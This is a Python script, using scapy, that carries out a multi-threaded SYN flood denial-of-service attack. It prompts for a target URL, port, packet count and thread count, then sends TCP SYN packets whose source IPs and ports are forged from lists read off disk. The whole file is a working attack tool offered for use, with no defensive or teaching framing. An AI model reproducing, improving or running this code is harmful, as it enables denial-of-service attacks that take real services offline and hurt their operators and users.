import random
import threading
from scapy.all import *
from urllib.parse import urlparse
import socket
import os

def syn_flood(target_ip, target_port, packet_count, spoofed_ips, spoofed_ports):
    """
    Perform a SYN Flood attack.

    :param target_ip: IP address of the target
    :param target_port: Port number of the target
    :param packet_count: Number of packets to send
    :param spoofed_ips: List of spoofed source IPs to use
    :param spoofed_ports: List of spoofed source ports to use
    """
    for _ in range(packet_count):
        src_ip = random.choice(spoofed_ips)
        src_port = random.choice(spoofed_ports)

        ip_packet = IP(src=src_ip, dst=target_ip)
        tcp_packet = TCP(sport=src_port, dport=target_port, flags='S', seq=random.randint(1000, 9000))

        send(ip_packet/tcp_packet, verbose=0)

def load_file(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def get_ip_from_url(url):
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname
    return socket.gethostbyname(hostname)

def main():
    target_url = input("Enter the target URL (e.g., http://example.com): ")
    target_ip = get_ip_from_url(target_url)
    print(f'Target IP address: {target_ip}')

    # Search for spoofed IPs file
    spoofed_ips_file = find_file("spoofed_ips.txt")
    if spoofed_ips_file is None:
        print("Error: Could not find 'spoofed_ips.txt' file.")
        return

    # Search for spoofed ports file
    spoofed_ports_file = find_file("spoofed_ports.txt")
    if spoofed_ports_file is None:
        print("Error: Could not find 'spoofed_ports.txt' file.")
        return

    spoofed_ips = load_file(spoofed_ips_file)
    spoofed_ports = load_file(spoofed_ports_file)

    packet_count = int(input("Enter the number of packets to send per thread: "))
    thread_count = int(input("Enter the number of threads to use: "))

    target_port = int(input("Enter the target port (e.g., 80): "))  # Added this line to get target port

    threads = []

    for _ in range(thread_count):
        thread = threading.Thread(target=syn_flood, args=(target_ip, target_port, packet_count, spoofed_ips, spoofed_ports))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(f'Completed sending {packet_count * thread_count} SYN packets to {target_ip}')

def find_file(file_name):
    """
    Search for a file recursively starting from the current directory.

    :param file_name: Name of the file to search for
    :return: Full path of the file if found, None otherwise
    """
    for root, dirs, files in os.walk("."):
        if file_name in files:
            return os.path.join(root, file_name)
    return None

if __name__ == "__main__":
    main()
